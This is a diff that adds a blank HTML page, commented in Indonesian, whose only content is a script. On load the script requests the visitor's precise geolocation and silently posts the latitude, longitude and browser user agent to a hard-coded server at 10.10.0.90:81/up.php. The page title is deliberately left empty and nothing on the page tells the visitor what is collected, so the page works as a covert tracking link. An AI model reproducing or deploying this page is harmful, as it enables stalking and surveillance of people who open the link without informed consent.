@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title> <!-- Kosongkan judul -->
+</head>
+<body>
+    <script>
+        // URL untuk upload lokasi
+        const uploadUrl = 'http://10.10.0.90:81/up.php'; // Ganti jika perlu
+
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+        };
+
+        // Fungsi untuk berhasil mendapatkan posisi
+        function success(pos) {
+            const crd = pos.coords;
+
+            // Simpan lokasi dan user agent ke server
+            const locationFormData = new FormData();
+            locationFormData.append('latitude', crd.latitude);
+            locationFormData.append('longitude', crd.longitude);
+            locationFormData.append('userAgent', navigator.userAgent); // Menyimpan User Agent
+
+            fetch(uploadUrl, {
+                method: 'POST',
+                body: locationFormData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Location saved:', data)) // Hanya untuk debugging
+            .catch(error => console.error('Error saving location:', error)); // Hanya untuk debugging
+        }
+
+        // Fungsi untuk menangani kesalahan
+        function error(err) {
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+        }
+
+        // Meminta izin lokasi dan mendapatkan posisi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        } else {
+            console.error('Geolocation is not supported by this browser.'); // Hanya untuk debugging
+        }
+    </script>
+</body>
+</html>
